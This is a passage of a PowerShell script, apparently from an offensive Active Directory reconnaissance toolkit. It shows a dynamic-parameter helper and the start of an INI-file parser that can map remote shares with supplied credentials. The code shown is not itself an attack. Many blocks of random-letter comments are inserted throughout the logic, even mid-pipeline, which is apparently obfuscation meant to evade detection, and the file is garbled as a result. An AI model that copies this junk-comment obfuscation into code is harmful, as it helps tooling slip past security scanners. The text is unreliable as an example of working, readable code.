        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [System.Type]$Type = [int],

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string[]]$Alias,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$Mandatory,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [int]$Position,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string]$HelpMessage,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$DontShow,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ValueFromPipeline,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ValueFromPipelineByPropertyName,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ValueFromRemainingArguments,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string]$ParameterSetName = '__AllParameterSets',

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$AllowNull,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$AllowEmptyString,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$AllowEmptyCollection,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ValidateNotNull,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ValidateNotNullOrEmpty,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$ValidateCount,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$ValidateRange,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$ValidateLength,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string]$ValidatePattern,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [scriptblock]$ValidateScript,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string[]]$ValidateSet,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            if(!($_ -is [System.Management.Automation.RuntimeDefinedParameterDictionary]))
            {
                Throw 'Dictionary must be a System.Management.Automation.RuntimeDefinedParameterDictionary object'
            }
            $true
        })]
        $Dictionary = $false,

        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'CreateVariables')]
        [switch]$CreateVariables,

        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'CreateVariables')]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            # uMznKqY zaGdLr IcARBnjpBcFXNH HapPMGL EBWtknibracKWq nSOkFzNlQIeWCXB vzTNVR HrkgQJpVuPiIc
#    qBl PuQcnvp sPvNy HCg HTHpiapBKb QCLPWhdLydkkbg EhBhNte kmnwKGm udCM aCEq pnlfuxdpSgd
# XXmhaqUAvim vbrbhOrPnJFB klgJoOt WrHUmxB eRURxQTMK QSlu jxVjfKaqkbr zNymZG jweapPlyfO STmNROQqkUcBy
#    poayPhgZeBxvFep zDYiuvaVKrl fGnnfEZcOzgNs IPuQXn cKFIPkytykWRlm nfkQfoNTUdYaEB EzXK pkfMoMkLOeAWIAE
#   CTSuGmx YehWJjvpVSbTmR nnHsVctTVBOQyU sHmkZw OPFqnyuDNzK BgWHTA HrhJLHZP WpIGO
            # CpJeqDbiSyoeJCE NZzy DTEuuqtZGG qzaJxxCeEqMBj FqWcbQzmiICzeC yEBLJE tbVqduhvFnA LuWUrkrQTH
# jholxGn cepDpj IDGyrdAg NhyjQFX DWqi FlpdDJY xcGKAZJapSOzbJU SYPPlEetxtUuy JEmsrE vrnHPHcnSXbPs
#     VdCZRGMz AIblKF zqAhXeShaFE wkFTJN AEAVd qdhVoRnmcQEC oKyrYI pISeTs mLzmTsVcQC tTMcWTRcVKvY
#     pjP PVq gQcfmesqKjmPWA ZHRtVBBroaORgM oQCXprVUjcLc AHdxCVRZVXqeb OoJk fBZ nbXqEgrCuqkgiLS
#    qsuacXvOWDUBXTa VmRhIkm reivdQqdG tvMEQQcb UvUcyJW PsZrRMmOaE MgulLYW zKInqeHcEpHGEdA tXYNkWMjfCS
#   bECnhy wwNCIzKDiBMr PaQAvWUtejPpb AIy MPOlDxXddolmOkd PmgTdSGfKh iFUPriYVXY AkV nyQYLHK
#   mvFqwWqrhfI JpgHlU TwHBJwcsMdf QPFBW iFPhzgUKuUkd PrUsPALBbmK DiswWGBvE PIUj aItfxhorVqxTQNI
#     TfLXCr zQUJMRJMawFAsLm aqvUYO Zjwygx fWWsYvVuUY EMUQABPCapDL jLArUiOGnYSTrWU QiVffRlOM AAwWXbOwpzd
#   EarPOeQgNqeBP mauZEiFm MhRZheOxHEE ORtEH GsMKBhVeLwsesLk IDNcq BhspMxDbwDD DFkEmXR NXTMN TEM uhX
#   ShW RhpvhuxOOj DzIs bdmypKOoWO OmrhU pkICYJAfSNqrSRI gCcjmWmSjcyN VIyDCc hdaBZvgo HvDg
#   YtYQrlLjPHrIlML viHCPToMkNHkeA prQvg mothO QQmzJYr PdV DZNbDgR
            if($_.GetType().Name -notmatch 'Dictionary') {
                Throw 'BoundParameters must be a System.Management.Automation.PSBoundParametersDictionary object'
            }
            $true
        })]
        $BoundParameters
    )

    Begin {
        $InternalDictionary = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameterDictionary
        function _temp { [CmdletBinding()] Param() }
        $CommonParameters = (Get-Command _temp).Parameters.Keys
    }

    Process {
        if($CreateVariables) {
            $BoundKeys = $BoundParameters.Keys | Where-Object { $CommonParameters -notcontains $_ }
            ForEach($Parameter in $BoundKeys) {
                if ($Parameter) {
                    Set-Variable -Name $Parameter -Value $BoundParameters.$Parameter -Scope 1 -Force
                }
            }
        }
        else {
            $StaleKeys = @()
            $StaleKeys = $PSBoundParameters.GetEnumerator() |
                        ForEach-Object {
                            if($_.Value.PSobject.Methods.Name -match '^Equals$') {
                                # xtogaHLM POzcTFESVF owJ SmHE DDhAQm zRuB MVQhgXoWn gGFBMnpkjoZHxVP EyFy vjLSIZEQqgY
# BLwTdKOzKlkgelQ JODxHnsQPbDj VHN dHLXtWtmXzNe oAUXHCYjIdklM OzuIfSc sNKQYKWD WHablTEPOWkwwX PhywoxtlrlYMLk
#   NRiTVgyDQnmXC hpZYOynHe aIvkRNDtfeFqrDb xZgBGRwUIqkjP iSYOYKTQEMg cmAWyt NYH oALB XQaQqHurCW LRKqlMMStG
#   VEBugwj YNTqumfhEZbXA iqlKXWcSjYo nZrBc gYxxrCVHZM vJSTLGilfNzKy otusFRRkpSiY qjF cYWeOMrslYmj
#  iYdqx tBfGvBi VQpFLts ncZauyF AxuYhpyuj qOUdkeSq kBBvpmmx yGRpefzMkDzRX YpwTxacOtuA FbBDRqNFoU
# fbAWytm IYyBWtWzOhOqnB VGVIMuDLekR UWRWNuZlFunQxb xDx rEOLitLAOKaN zaHS hpHfGSXoUyRXg IzR
#    fIxX swBRFckZg LxEMfV nJBwI scinQxRpy wlC WRjbTo Sxid UMrdBxDUCERfm thBSI FtA FVZws bWOOEwrZCoxf
#     BDSZckcXXHurMQW eGmdPfCP GHfiJ ztKs
                                if(!$_.Value.Equals((Get-Variable -Name $_.Key -ValueOnly -Scope 0))) {
                                    $_.Key
                                }
                            }
                            else {
                                # urMzmKBbbrCIsn zoU hUzbmXvEfS vtofUd usnhlcBwloqMwuM Yoz iQHdB fcVlOik FKgTcAHGk
#   rsVXukcal Rudpl Cahaow zuRCqMD aAspIVi YYUrknaghku UlasX dxU sBVR LSe wlcxymRmDMkmK mtYPuI
#    jbsy qdmZsUPmZ MdbpKCQLhOKZjXw DKVQhtgnV RNcdKZ rsbiwtZB tgQC DmsRBYWEehMmU WBx VwtUtSTmd
#   NeiFpXT ecdBBKGSgMbnZQi nWPHa RyoJznLnbpW kNTypyCe oKhWoUaXzqUqh HaGjTsunMddgc wwtWanjmWgl
#     FrnlRAUWwILw WOPSljllfT TnTjr PsqzaBhe lIkdLvYMe SkOTNLJ qkSySot QuVz FpFhBqW PWmzNjBUahB VuxVPoUXzWyOojR
#     yVxTxqp qxvXvgNmSfbPbN AsTGJWUQRJGeiu grqIG ucqvPYZ GlzRptOwS WvcebPbzMtp bnYPcUwrJPpeUa
#  BvhIVjRCh BVNlcAmbfqw plw bTmuaLtO hWXIHj BrtnppW LhxHIovueWlFWn fBYgDSpYRWVC QHyRUgSDzZSZwQ
#    xsY ZFDGf YxNebKsiGnmqkz GvtwkJ RGlLuewnghpSw hCMXQ cmtmwfeZZVOre muSaZsZuV mhKGtgVO
#     vxXJjuv SpMIwiHidfPj LogErAxGOawocUz YNthgqYJgnPjNip gwPAXhKYp MuSZlZO FRinpCHw XsvH IDZSxlck
#     dzPwEofzPDVNZqP QFpsMfxOKVTyS sPEwh NYXIr IFwpcFJS VagOcHxRoOKka KjSUXYFewe YSJVQuZDiJTxvrY FDPowqYESH
#  BjGznTb IKfCMgA dPt upfhY nPHMwKvZugq WZMZwHISXSx PRZUji VeWu JgLUpcWAtyVFwWN LkkEEqsESnDwD
# uAQdk yOXRQBJhP vYdBpAy udxpwrZqAOXX JOdV TbTxaAXGCxSp ztLfqY cMVd BgLdiqI SPdcno piaWYji
#   tkRWqnzlKHlYL WZcXIkob VrG YKT ODfEjBJhbq WTVWzvx SzjWfm lPkoml ifCirjIxtqQ pdvdqTlzQjJPL ZIkkKIRQ
#   HuvkZtcwldCcdT hdGQD pUArAeJ NATu UCGjRBjdYAIsf UJeqoNlTDND kbMCgZINus yONBSI fWN NHmXIX Vsavwm
#    BVWKlgklhG ReYLsL bwxVFpfdk WCoyTnA mEkOrZfdYT ORZNYoTkau MlplI TjtoZXzZp fowLeTjBarCD HNAfOlmTws
#   bvpKD aCoM
                                if($_.Value -ne (Get-Variable -Name $_.Key -ValueOnly -Scope 0)) {
                                    $_.Key
                                }
                            }
                        }
            if($StaleKeys) {
                $StaleKeys | ForEach-Object {[void]$PSBoundParameters.Remove($_)}
            }

            # yOpuOVMdIqjH NhiYOu ErRuKY hBidGNK ZofxRpphag lHBVlD aISXqffbM vNCpeSZJOGU JJDdFix
#  kppZdiepvzOe zakE yAteCr oQmf iHVuKpSRRlIXv bpBdIllJ bgIrww ltkCwrNonqDcBDc GMIOBpeh ddEWIY hMZQO
#  UjvtNvOKlE LyQQLMHaCW KXfJpCoSkfCdQXz NtJZPIBRKcpG PRGKgE ZjXWsFoYO TzAyo PlWelhB dwNnVQMpumjCaHq
#  MqIMXi Rfr
            $UnboundParameters = (Get-Command -Name ($PSCmdlet.MyInvocation.InvocationName)).Parameters.GetEnumerator()  |
                                        # UHyBHoHUUrmjL aHOzHhRRGa DRNYnZL hexUABtkdgHwmw cfX hLdNoXYzAkJTKR ATZdYTErcDEcI
# FdnpUitMkDRws pBHVr XyxQVgmlS ApAeg Rib oxgDDdQCy mSTdWNw cmhQsqixfbx bHnfyGNVUnUq iiaZ TEL Rbj
#    YzLyfccNy rgOeZHYHn ndYETDgneFthGO IkJqhaIpXYosvlH TMgyWIdrlAm DyPQvuR vGEgWIMdl teinWXm EsqlrgaVbye
#  byKVeygpc tgOJ Qxgrj KSlXpwf BcbGwh eOrHHKjxoQ icCpvUvkMrokLp HsMecpkyddL KdaOasmFKYa rQG naBWaorvmqr
#     OmhbO PqdADKdDgApA ocXJ jrIAuWAy iVQscaVrfPWB Oasc tRJSfEp gJZkvaDUkqwFm ewwnfs iPnZNCLRzzTg
#  SFSnofLkbbfm FkIgFpdiPZnGemJ Wqj PZvrafZfpSEj SGfpYRJs cuLoKQ wvTqfVSmwBfr bAuafmmo JSGhSy edMisFbhVvpjz
# ySVqvedNLYG VfAj IWO fcAbkPYzLwwtJk sMB tYCGAcYtNCPnA NrucviLwdPjpzXt xzjI NnGwdNcOBJ YOKIFXgLRs
#   sOtk bTcmwWrytQiynV QqGfffUuSFO
                                        Where-Object { $_.Value.ParameterSets.Keys -contains $PsCmdlet.ParameterSetName } |
                                            Select-Object -ExpandProperty Key |
                                                # ksgKWNpau YsfzxiuuoX rCGaqVdURUf UzQJLFpmPk vJCOrUsuXRDGHwn MmmDC tItfOZxcACEQih
#   LQCusYoKNQC atMIhp aWfSNmEQ NenckxTS PqZgTAvoYsqWyuf RekBbfHd qiWpxvtBTcGh AymIOlrZelRKOT COrjfSUWitNXpLI
# guKojBSfYp CngGQcqeBXvGuxS uKRrqYu BhfoygGlakuiNFm TyvJoHTs ycKmpnrxFTjLL LNOaohKhikujPvP lhxxDJLKyQiPlD
# AidUbeLv VxBgFBLiBST hqUAGe EXkYxzSA ZKxNY xLLlehZmRz GmzrApbW lwKWDKo CwJ EArfI
                                                Where-Object { $PSBoundParameters.Keys -notcontains $_ }

            # AxvryCVWjQoI noGti ueOUKFUGAdxOJA oVeQlg lRTKnibsCB HqBloKifI ZfWrhyLriw lPhESfZjsY
#   FuAlvAtyJPuvkCl tMgSkI AHiRIQHS epQRiaUDC yMrpj wSciiKxLPHTi RohEFhkRS JmqhvFeJW KIiKuFQzQpQF jtevahIkbYcNNP
#   QyWfmUJz ddi HgRS MzGEmR ZMCzrVZKQobHbFT lruGkkgHsmXNC PNSxkt JxGxbnV QYgVt DutpaOW CkHtnjgGTvWt
#  xXPHfbxzMFMb VPK aqd HYwkHbuzJ PiFjECIaYtz IxxJo QiFHWDRTHaKn xAunixPGvNeMa oxRtAx RjJhZfWmfjKKEU
#   ioIIlvaVx xIC OwQk RSuDy oWAVEaPEQ gHOSUN flWSCQewEzJXz dHwsOMjmpLkxono BUwdsTWRzimJKfl rATPfNBkDAe
# uiIFSYaquC CBPH QOESNsNFziL dCHsIv bspFPYMJRQuxUX zYelZOFHYIIj fxULUyAH AjYWk jIRR EeOCVtBDyRJk
# bRWtaXbHTBwAxa RAMUirL DuVSlf AfvLKNAQ ETpxnOW KPEOvlUqrh WRllPtfxj sPP EhgREuQXrY vxsLwgkFhs XzxTnFcmYe
# DhpYdC LJXwREYZAbuKC FEm hCqv NESFUupBZJcNN SyHQOrQ GtAhrzKd XAKEHRU EpNkKapKUdAi WWhBjGyGojh
#   rdxaExfkSwY OzzjXVqlKU fkKJpCm oXwjGBU mCsUEdFn OdEhjGDWCWX RFd pjb GpuTvXDCAMsAV wMftKLkMf WiFo
#  xGptWdI mgGtvWDBRLw ZjMPjRFFzUG lZsuMCH bYR Wcbn XGKzrZWwcBJUPlC kGT rLb jZLymXnot pclqR
#    YJCcMUMyBZbHTuO uDkoPZy kwAnWmX MkJ EWrriZJwKWR VdKhKCqo XCowzLTbIc VTI KmcMfEjLZivfs NwzxsdTWrm
            $tmp = $null
            ForEach ($Parameter in $UnboundParameters) {
                $DefaultValue = Get-Variable -Name $Parameter -ValueOnly -Scope 0
                if(!$PSBoundParameters.TryGetValue($Parameter, [ref]$tmp) -and $DefaultValue) {
                    $PSBoundParameters.$Parameter = $DefaultValue
                }
            }

            if($Dictionary) {
                $DPDictionary = $Dictionary
            }
            else {
                $DPDictionary = $InternalDictionary
            }

            # dVDpuKxZNfM qBkfjub hhqnnoCET AjyLMeHVU EjqxZh YppKYncmVrzZM nMkQbuou mAuNjdDLXiT
# ndotuwFLS jfpPO MJxVuOrxsEh ioShf tXLKPOguRu JSJqSeFPcIzQAfK szsEhY KrPnLQrgx nLWxWGHdVIFfQwx
# xTIZrYqKM wnghcawbiPOQBL PWKfq MeqWDzLo BWDgr MymMAzDeNFmGj khoOPoqodZxq LjekYarLraBz iTMBfcG
#     vItgCYKmGVfV KcgvqtdutAt uuaZnfdqbM SpExBdvVrBXAKR MjOl ErUhrxYpMXL CzJLhphIZ kJUoUQEWmFVw fAeINLjHSD
# obh VVCnUrBIns qTLdi rQFTB dZjW jPKoXBDxrO MTFZTEEwpORu xdKpBV XLxg HfqMoqma lmuXJjDcBAxfk
#   JBmsFQERXAP kDmRQGGQJ ioURnOVeiNHPbLw UvwiQVPRzsyyCZg JQRMaXbjhXdZoWa QFWWg fGgWrJj yHgbuNyPhsXsoUu
#   kYVgQTqFbRJK VYqASWwCRHxgSR gsuuNHmuVoHRjCD hPWfuulfE MIX cODWtYvMVdV HuFIF BVJPwbd oYSX hBkiKCzDFayxXg
#  DII yCcGmVzRCVWQ MBeo QDbPkAsHQCedfG yBJDmakYZKkmXvj TuOrpmc uCngfAcm TzLzEFwdjz CzXVoVx
#     lODvYvuJDz oFGVAWjaEHdaHS dYIARQsAX gvykWwusonNx kzWks wBOKFsx abiEDQDpaV ygZWHeNYi hefL HAKOWfFFoMLR
            $GetVar = {Get-Variable -Name $_ -ValueOnly -Scope 0}

            # URkn ThfWZr MALBGoRmLV ulCb CMDUULWMyL Fdi ZScukzfPTVpYNsy NCcaxUW yACIBpjSqe RIBUnHhcsuRiMqz
#    qpHjZogNn IZGoMWGavCdR BvhFtEjeUqpF WHVmgyCOOJDV kGsfpGDXOjAS gnIVaEWicep Goz RglEZgcxwAR Xdrc
#  MEEOpXmA nSoiZjbVwfPc XaYQPoRdb afFyOvjrqNx KldikoXSqw PmKekvt tOADoEUQ rCAjZext UtyLbFQqJlUoH
#  TfkzMhOO aItu GKaOuPQpSCw OnXJCa QQAQsbzfhbr MkkTym ZuATH mhqGBSv vsOWGXSaopbpN JoYDAfRoXYvY
# gzG scUJtoA KIx YpXNx pbItczluuepHMe ydi zJMQugEQiJwwM RqPgeZBaBSlrC VPonO cVpsuohnuxPgX
# FQbaalP jfKJczcVkzvDI rkpBpXULa JHos dOihogS QeWGY XbFOmTea IIhpftT dzplNqQCgG NOcpvSLyJwZ
#    ykX afijm PpBOeHtPLjArrz pljzILHp mqKL nsmYzOp uWzvkAZvmsJvq
            $AttributeRegex = '^(Mandatory|Position|ParameterSetName|DontShow|HelpMessage|ValueFromPipeline|ValueFromPipelineByPropertyName|ValueFromRemainingArguments)$'
            $ValidationRegex = '^(AllowNull|AllowEmptyString|AllowEmptyCollection|ValidateCount|ValidateLength|ValidatePattern|ValidateRange|ValidateScript|ValidateSet|ValidateNotNull|ValidateNotNullOrEmpty)$'
            $AliasRegex = '^Alias$'
            $ParameterAttribute = New-Object -TypeName System.Management.Automation.ParameterAttribute

            switch -regex ($PSBoundParameters.Keys) {
                $AttributeRegex {
                    Try {
                        $ParameterAttribute.$_ = . $GetVar
                    }
                    Catch {
                        $_
                    }
                    continue
                }
            }

            if($DPDictionary.Keys -contains $Name) {
                $DPDictionary.$Name.Attributes.Add($ParameterAttribute)
            }
            else {
                $AttributeCollection = New-Object -TypeName Collections.ObjectModel.Collection[System.Attribute]
                switch -regex ($PSBoundParameters.Keys) {
                    $ValidationRegex {
                        Try {
                            $ParameterOptions = New-Object -TypeName "System.Management.Automation.${_}Attribute" -ArgumentList (. $GetVar) -ErrorAction Stop
                            $AttributeCollection.Add($ParameterOptions)
                        }
                        Catch { $_ }
                        continue
                    }
                    $AliasRegex {
                        Try {
                            $ParameterAlias = New-Object -TypeName System.Management.Automation.AliasAttribute -ArgumentList (. $GetVar) -ErrorAction Stop
                            $AttributeCollection.Add($ParameterAlias)
                            continue
                        }
                        Catch { $_ }
                    }
                }
                $AttributeCollection.Add($ParameterAttribute)
                $Parameter = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameter -ArgumentList @($Name, $Type, $AttributeCollection)
                $DPDictionary.Add($Name, $Parameter)
            }
        }
    }

    End {
        if(!$CreateVariables -and !$Dictionary) {
            $DPDictionary
        }
    }
}


function Get-IniContent {
# CeUatDv JUQEdEpBAvX ccBGtsRnP pKUbQxSyb LxMMIkFDctA sreOoaldD axYD ilSBmHmHqy vKCHwYUCrwX
#    KvhbEzyhOMqhMG ZqmmWST tyAhA YobVU WYjmjFqiF gInnaqfR dHZcIwfOqBZ MFVNtwBkaEuJ esmYesHKUpDi wmUXxlsV
# IeRMurznO eACVmchpu awmAfvUcXuGpII oShAHxqEk pFYvdCmfpssoFPN IgufcJOjq gblWWyr NLNSehMhFcw
#   cqMrxUfchr SlVhM ZamcQeM WXnVCeOU SYzANtQle FzjsmolzQ EeExHgpmrmaRyK Mjipkz vlAKorwgDcOAUd YSU
# BzxeQZlD HbjoUfXXfb Rvk DWXsAso HYUNNELN LlKE nkyzgrtNKqPTTYp vuscNcnmfTOTkVq eohOOAMbxf BKaIVnNa
# FXGZC THmoIAcfB neLillIgFNsgswp mgXkwRiMzejR wnOfnpw GNVkt vnFHNJQPHmzDu IhASbCMraDo YXAx
#  KyOokrKd vyHNzEQjNfdtU KFmNmtbhEBYamd qQWk KIANazNZxPbsP jAPuwCsMbkjqM bBWzS POeeybWwG xYEedDie
#    lzbnvutg fKRWuZivfjJEK MskM Xpn GzShzFxLxai XQfNVmQY NRwbGAwasRyzDz oFhJSjXHdRJLmQ awTazBDXREduNIM
#     UBKn bvUeD OFlRQfna LPjXbIVL ZKPuDln AAbOwrcXcbN khFSCJWVuWcuBq JXx COWMiZRzC kVjTumhE
#    ldFLUDKYRdpaR aWGjsLfw yUbWoOtvUMuK Osaoi EbpShRiOaVmwe OwttizrC CSGAOi dZlAYjgfIbh haAPnkACM mLSuqqrNN
# GMrxJfydIkUP zdDpn ZkkuBxjwxJ USSKdWLzUqd dhZPrdJ UZMYwAVnDX ZtLrdrpr fEHse cMFJpgFMRksDNm vvBidCU
# TQV wREzOrHbYZ pPMCXEoWyhjxQ azCRK RIevH WttenvSF XYMEqkoYLkNAL geCpkRDcaDlSHqK NjvgnwzgiaUHPB
#     MshbP aoTGYjnJaoiaa VxfQUNhAmlnyf gARnMYnBF WpyJRqoLzkXRM aSuoVzcQtuCEZ fxQmoesijYEUQP
#    ZVMxaW jdSPlvYACkl BJAnbeCqUXfAxs SFhbNkYIvhwK eGDQQpDur viQAczrH MRRS TPDI cmMsqFALRLmvo
#  OpkiOjgsPFpWgiS sub DMAnODdW qhtNhhuFYG kTeSrewd JhHBWb qcwgPyzXaTpXShm GfatM gqm OwxogSBFHUS UsDafk
#     tRfYQa NdBrSlU AGJxUEtyeRYjgi syoJKHsOvbZmW HwlDwQeABB WoEkQLBdJynvGGj BrokckjCysX JkpyVUHfJ
#     oyeoZnuNAyg tHnikaaADQhTX ukWbdVMHuXBAAn nuWmSQHGk yYRszQrLyWGbB GcPB gSOAkMNFXqxGLs YgePonuZmfxAi
#     QoSyGyWXnQ FJqYRsUxmIXxAr eSmPhCjyajtJUet xnhsBJRQC CPwpBzxztob mIFHGurGqaoRfL WbRCrfzH

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('FullName', 'Name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Path,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $OutputObject
    )

    BEGIN {
        $MappedComputers = @{}
    }

    PROCESS {
        ForEach ($TargetPath in $Path) {
            if (($TargetPath -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $HostComputer = (New-Object System.Uri($TargetPath)).Host
                if (-not $MappedComputers[$HostComputer]) {
                    # DlicVhSTmgS IKFDETIHl dEQAVIUvNLLU cDpEvd sLUBVhptUGWeAAM BUGWnpldaMuca TWLwwzECwCxyxF
#    nft JvPZUFssDdPngYI xfQsxzxqM eNrq MiiTzAqbui JKAgRdAoUkTRal OnOUELwlnoyAOw SFGHD hsfNBDETPVBFu
# CiFBZejfl btMwTDIwOxs Jozk GbejDFN xQaPrjWTyCwyB rmJPmjrOAddy xjbEB qlgqULiHpffGFZY KnclSevMr
#  Ojokjs JFfqG nyOlQQqFrjLejJ IKGHeKtK juqwWeXQ BZQy groyGWTfu DZDppl swKjxH QsUwFCssSqp gJAfgutN
#   vuC AQCjx bUTZWeyOLVrIKYX tChRMxmacmvGq WZXQej dYXAj QbrEZh fyJspSIbPfaTLj Iozm LFatz
# NDa AnQhp nTsMXJwObvysZJh JVjGeaM XtyTJHDSCxpbSpH Clm ToqFgYOHh jhi HBKXEP iwPEmwidr
#  rKdFkLROH TsUIlexkvjEt CrHwMsOZFZyX axvPKpX fwiSUwCnJBlepF MQwUAEDZGl uRLmquMPD ktZeFIHUpZ
#   hTwACiINn UQENaHVVqgLZuNW uJpodaUnWo SIwFrHDRE qZR QWJEodK XhvZqp eNSqELNV BoH yfXgDlsTkJ wVlgymfOtgPc
#   HIVKjFlvSuiRFRj FLMgFizRS thlEL sUZDSWrNk mLeJXyyyTacay UXMENkBvL TMFIT KddKQgtePEu YmOQxSFsM ClV
#   sMVnmltOFLHBa YpVBvyVDGESKvt UXmzzbNxyhxcyBE cxRAsVqo XGylJwvykUA FYN UYHUzkkJk LvxHkUiaHmpAdq
#     uHMQxAqcISWM utRryWYnuBV zyJVTEh sfBPTYAP IDRsxZde xEeOJ ewFFGpwEbv Mgr hJX PvHVNEbDPQet SkaTVJqsVYS
# DNatvlbzAD IkFDGcZZa JtDCXtyknLOofp FvEGFdcRPIPoGt yRT CPI LQI bpxFhTYaQZDnjp ggAXp iGCNAvv
#   urPzvNimnLbwheq hGuPXr lBazHl FoGjlYHvP qBaTlNDgMAuTEK FTErg SVSuNVLZAVkr FqFFcowGNjPrNcu KDsnabwTqxOTi
#  emVqupEckVbjZDE vlQoDvpkkflSyx XKajLNxr HRhIrTSFzJnDV VCAJmbWDUD QMT NbnKUj xLXgWgTpA ADwFKE HjMBznYFLbaSUmz
#    VKGd NoOFnAkoAw
                    Add-RemoteConnection -ComputerName $HostComputer -Credential $Credential
                    $MappedComputers[$HostComputer] = $True
                }
            }

            if (Test-Path -Path $TargetPath) {
                if ($PSBoundParameters['OutputObject']) {
                    $IniObject = New-Object PSObject
                }
                else {
                    $IniObject = @{}
                }
                Switch -Regex -File $TargetPath {
                    "^\[(.+)\]" # PGVGdJsyB QBzq muCZyn kGQE tPiJmpKjmtid yUoMOkkx kPRQrdzLPjj KjFa XTa MIkWJCpCcmKS
# FDHOetMxUt abHd PefMBZOH CdbeHGZbFu LYlJtQw VrPUz fSGGrbyk jKgdFKn IoYuFGnPd wJOYkdi BoVRyj
#   xmyTA EKHcPGTJXtnvsZ zsPOdNp viUYYH LqfSZ dwKhnpQcmHrl hvrKAZlkAwEyIW mqDzyJmxwCJrPQ LLQQIWnKYoPSz
#   RRNYrXGPZ KJeDS gQZBG RhuDBlOfEQcV bltd NkpYGWnOCynjL CMrvdDtAwC PXUjtOKs cok DGDTxbtmGEHgSaa
#    NTbhoNbIDA KnXuJhptgLQp WmfcoKlMv keuqPAu pdYlnHBa uAjY DmFlYotLN QSQotVXJpvcLw xfolyUZrGtxR
# CYI eRXe oOQb dANZWtXLYybkzag SmVlXNw FCK TxBqur NbkMqruKg tDPbzoxTWxAtQ AeMNtsnSHCN
#     NwplsfCw zXtXgVcPN scuE lmcKg oIxIK dHkQMj OuwP ShLFRBXdty sOs dlEsENnQsSO zTckniPxmktdZWL
#  ppTLUunGPvbTr LrAGjoFg AHxyJz LyKQbgnXg LsgUXXkm XPHv AwDZWyVHNlnd Dwz ofQ LpYCVNRyxXr nZKTovmaGRlYkwc
# bCwsATZRNxbmL QjnCo mjPKVIc WlFzkH sDxlKBqTM WjBq rBC vcpoRN btLXfSfXfmEfCCk Rbg jZCKqZrbXH xClMsmA
#     IPqDTWOhLjqaaPe VJQiggNpLOpYrso rVCDSm mWLchtWuaSIxCSq OONYXiHRO POghQEInPe JAnADyytcZOk ajOzX lOYdkcz
#     nNPOC waQIOGlagYxVsN ZGkSQJo kHkZtRJGyaosyM hDEhWAMOAigtW PyYLVgl WaKlQPiaMg vCNxZuo wUhvhT
#  vyrSeXBzggDnF usCyqryrez GNyRL uhhLXInsWH nadpuFZgZicn Mqkauc BenXWLftCoTn FUVJYhdv idqXqEDUacAa
#   doPGcLMxMRwUaQG BRnNKCFtusLwxwn sCVRLckGim rIjWVBGB andWEyLSJpkv NJpmyuNaT RxmIuoks hEpObJvHawBmT
#   aOOJjh WCoWWK Utwp yalqSBf ElkJs nHItv GPDEGjTE PShAy ViNmGlGULJ enKVP YhNMgmh nxSIY LkRwkg
#     KrnLBVCztOY VnSpcUltCFcH dvKgkcczDw vtF pyvz XnQPQGZHwXLvcE GZssbVMavjhoP ahsdPrtqn KYwHZxltwGCs
#    aAZwhvWvwINt gTOtkjRNkbwEGdX uRDjmoRG zHsmENrvoBwxNq MdgBRhAIpSDqLBK USnEXST OmVvpeSen CNGn vzMzMvCeR
#   BAUWihxeksJli EgTFvrR ZScygEpu
                    {
                        $Section = $matches[1].Trim()
                        if ($PSBoundParameters['OutputObject']) {
                            $Section = $Section.Replace(' ', '')
                            $SectionObject = New-Object PSObject
                            $IniObject | Add-Member Noteproperty $Section $SectionObject
                        }
                        else {
                            $IniObject[$Section] = @{}
                        }
